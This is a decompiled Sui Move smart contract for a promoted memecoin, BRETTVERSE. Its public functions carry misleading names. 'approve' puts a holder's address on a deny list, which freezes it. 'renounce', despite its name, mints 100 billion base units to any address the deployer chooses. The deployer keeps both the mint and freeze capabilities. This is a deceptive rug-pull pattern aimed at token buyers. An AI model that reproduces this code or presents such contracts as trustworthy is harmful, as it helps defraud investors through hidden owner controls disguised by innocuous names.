module 0xd0d846eba003e5c27097d96cc31f1ad14987dc94c5dd9754f2fbdb541dc47617::brettverse {
    struct BRETTVERSE has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BRETTVERSE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BRETTVERSE>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BRETTVERSE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BRETTVERSE>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: BRETTVERSE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BRETTVERSE>(arg0, 2, b"BRETTVERSE", b"BRETTVERSE", b"One of the biggest coins now on Sui Network. Join Brett Metaverse now on Sui Network - https://www.brettverse.fun/ https://x.com/brettversee https://t.me/Suibrettcoin ", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=265,h=243,fit=crop/A0xNoo3xKDt2JjnQ/brett-YrDl9J21NVUWVk9O.png"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BRETTVERSE>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<BRETTVERSE>(&mut v3, 1000000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<BRETTVERSE>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BRETTVERSE>>(v1, v4);
    }

    public entry fun renounce(arg0: &mut 0x2::coin::TreasuryCap<BRETTVERSE>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<BRETTVERSE>(arg0, 100000000000, arg1, arg2);
    }

    // decompiled from Move bytecode v6
}

